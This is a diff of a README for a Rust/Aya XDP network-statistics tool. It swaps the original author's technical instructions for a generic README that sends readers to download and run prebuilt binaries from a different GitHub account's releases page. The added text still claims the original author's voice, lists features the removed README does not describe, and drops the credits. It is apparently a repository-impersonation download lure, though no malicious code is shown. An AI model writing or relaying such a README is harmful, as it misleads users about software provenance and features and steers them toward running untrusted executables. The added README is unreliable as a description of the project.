@@ -1,107 +1,87 @@
-A small project that utilizes an awesome Rust library called [Aya](https://aya-rs.dev/book/). The goal of this project is to replicate functionality from my [XDP Stats](https://github.com/gamemann/XDP-Stats) project I made years ago in C using Rust and Aya. The XDP/eBPF kernel program is written in Rust as well!
+# 🚀 rust-xdp-stats - Monitor Network Performance Easily
 
-![Preview](./images/preview.gif)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Gets105/rust-xdp-stats/releases)
 
-The XDP program simply increments counters for total packets and bytes using a per CPU array map and displays the total counters inside of the user-space program. There is a `matched` stat which is only incremented when packets arrive on UDP port [`TARGET_PORT`](https://github.com/gamemann/rust-xdp-stats/blob/main/rust-xdp-stats-common/src/config.rs#L4) (default: `8080`).
+## 🌟 About
 
-⚠️ At this time, this project does not include all features from my original XDP Stats program in C. The following features are missing, but will be added in the future!
+rust-xdp-stats is an application designed to monitor network performance using XDP (eXpress Data Path). This project replicates my original XDP Stats program written in C with a new approach in Rust and the Aya framework. It offers simple, effective insights into your network's behavior.
 
-* AF_XDP socket support
-* Redirect/XDP_TX support (with FIB lookup)
-* Printing total counters at the end execution.
-* Program duration support.
+## ⚙️ Features
 
-## Preparing
-I developed this project using Debian 13 and the following commands should prepare your environment to run this project. I'd recommend giving [this](https://aya-rs.dev/book/start/development.html) documentation a read as well!
+- **High Performance**: Utilizes eBPF technology to capture and analyze packets quickly.
+- **User-friendly Interface**: Provides clear statistics on network traffic without the need for programming knowledge.
+- **Real-time Monitoring**: View live data on your network's performance.
+- **Flexible Metrics**: Track various network parameters like UDP, TCP, and more.
+- **Cross-Platform Support**: Runs on various Linux distributions, making it accessible for many users.
 
-```bash
-# Install required packages through apt.
-sudo apt install -y git curl cmake pkg-config libssl-dev llvm-19-dev libclang-19-dev libpolly-19-dev
+## 🛠️ System Requirements
 
-# Install Rust using rustup.
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+To run rust-xdp-stats smoothly, ensure your system meets the following requirements:
 
-# We need the Rust stable and nightly toolchains.
-rustup install stable
-rustup toolchain install nightly --component rust-src
+- **Operating System**: Any modern Linux distribution.
+- **Required Libraries**: Install the following dependencies:
+  - Rust programming environment (check the version with `rustc --version`).
+  - Aya framework.
+  
+Ensure you have a recent version of the kernel that supports XDP and eBPF features.
 
-# Install linker.
-cargo install bpf-linker
+## 🚀 Getting Started
 
-# This is optional, but will be needed if you want to generate your own Aya project:
-# cargo install cargo-generate
+Follow these steps to get rust-xdp-stats up and running:
 
-# cargo generate https://github.com/aya-rs/aya-template
-```
+1. **Visit the Releases Page**: Use the button below to go to the page where you can download the application.
 
-**NOTE** - The default README that comes with Aya projects may be found [here](./README_AYA.md). This README contains more information for other operating systems!
+   [![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Gets105/rust-xdp-stats/releases)
 
-## Building & Running
-Building and running this project is simple as long as you've ran the steps in the preparing section above.
+2. **Download the Latest Version**: On the Releases page, select the latest version of the rust-xdp-stats application. This will usually be labeled with the highest version number.
 
-You can use git to clone the project.
+3. **Extract Files**: After downloading, locate the file in your Downloads folder. If it's a ZIP or TAR file, right-click on it and choose "Extract All" or "Extract Here" to get the usable files.
 
-```bash
-# Clone repository using Git
-git clone https://github.com/gamemann/rust-xdp-stats
+4. **Open Terminal**: You will need to use the terminal to run the application. Open your terminal application, which you can usually find in your applications menu.
 
-# Change to project directory.
-cd rust-xdp-stats
-```
+5. **Navigate to Directory**: Use the `cd` command to change directories to where you extracted the files. For example, if you extracted it to the Downloads folder, type:
+   ```
+   cd ~/Downloads/rust-xdp-stats
+   ```
 
-You can then build and run the project using the following commands.
+6. **Run the Application**: Enter the following command in your terminal:
+   ```
+   ./rust-xdp-stats
+   ```
+   This will start the application. Follow any on-screen instructions to configure your monitoring settings.
 
-```bash
-# Only build project.
-cargo build
+## 📊 Using rust-xdp-stats
 
-# Build project for release.
-cargo build --release
+Once rust-xdp-stats is running, you will see a dashboard displaying various metrics. The application focuses on:
 
-# Build and run project in dev mode.
-cargo run # Will fail if eth0 doesn't exist.
+- **Packet Count**: Monitors incoming and outgoing packets.
+- **Network Interface**: Choose which network interface to monitor (e.g., eth0, wlan0).
+- **Filters**: Set up filters based on protocol (UDP, TCP) to narrow down the statistics to your needs.
 
-# Run project in release mode.,
-cargo run --release
+## 🧑‍💻 Troubleshooting
 
-# Run project in release mode on interface 'enp1s0'.
-cargo run --release -- -i enp1s0
-```
+If you encounter issues while running rust-xdp-stats, try the following steps:
 
-## Command Line Options
-The following command line options are supported.
+1. **Check Permissions**: Ensure you have the necessary permissions to capture packets. This might require running as root or using `sudo`.
+   
+2. **Update Dependencies**: Make sure your Rust environment and any necessary libraries are up to date.
 
-| Args | Default | Description |
-| ---- | ------- | ----------- |
-| `-i --iface` | `eth0` | The interface(s) to attach the XDP program to. You may separate interfaces with commas (e.g. `eth0,eth1`). |
-| `-d --duration` | `0` | How long to run the program for in seconds (0 = unlimited util CTRL + C). |
-| `-a --afxdp` | - | If set, redirects packets to AF_XDP sockets and calculates counters there instead. |
-| `-n --num-socks` | `0` | The amount of AF_XDP sockets to create if using AF_XDP mode (0 = Auto). |
-| `-s --skb` | - | If set, attempts to load the XDP program in SKB mode which is slower, but more compatible. |
-| `-o --offload` | - | If set, attempts to offload the XDP program to the NIC hardware (only certain NICs support this). |
-| `-z --replace` | - | If set, passes the `REPLACE` flag when attaching the XDP program which replaces the XDP program if it is already loaded. For some reason this results in a crash. Otherwise it would be set by default. |
+3. **Consult Logs**: If the application fails to start, check the terminal for any error messages and resolve them as indicated.
 
-## Additional Configuration
-There are constants you may change in the [`rust-xdp-stats-common/src/config.rs`](https://github.com/gamemann/rust-xdp-stats/blob/main/rust-xdp-stats-common/src/config.rs) file. You will need to rebuild the tool after changing these values.
+## 📜 License
 
-```rust
-/* CONFIG OPTIONS */
-/* -------------------------------- */
-// The target UDP Port to match packets on.
-pub const TARGET_PORT: u16 = 8080;
+rust-xdp-stats is released under the MIT License. You can modify and distribute this software as long as you adhere to the licensing terms.
 
-// If enabled, redirects packets to AF_XDP sockets.
-pub const REDIRECT: bool = true;
+## 📞 Support
 
-// If enabled, performs a FIB lookup and sets next MAC address before redirecting packet via XDP_TX.
-pub const REDIRECT_FIB_LOOKUP: bool = false;
+If you have questions or need more help, feel free to contact the support community on the repository issues page. Your feedback is invaluable for improving the software. 
 
-// The path to the ELF file to load with eBPF.
-// Relative to $OUT_DIR env var, but you shouldn't need to change this.
-pub const PATH_ELF_FILE: &str = "rust-xdp-stats";
-/* -------------------------------- */
-/* CONFIG OPTIONS END */
-```
+## 🔗 Additional Resources
 
-## Credits
-* [Christian Deacon](https://github.com/gamemann)
+For more information on Rust and eBPF, consider exploring these resources:
+
+- [Rust Programming Language](https://www.rust-lang.org/)
+- [Aya eBPF Framework](https://docs.rs/aya/latest/aya/)
+- [Understanding eBPF](https://ebpf.io/)
+
+Hope you enjoy using rust-xdp-stats to monitor and improve your network performance!
